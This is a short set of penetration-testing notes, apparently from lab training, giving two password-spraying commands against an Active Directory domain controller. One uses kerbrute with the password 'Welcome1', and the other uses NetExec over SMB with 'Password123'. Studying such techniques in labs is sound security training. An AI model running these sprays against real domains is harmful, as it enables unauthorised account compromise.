### Using Kerbrute
```
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
```
### Using NXC
```
sudo nxc smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```

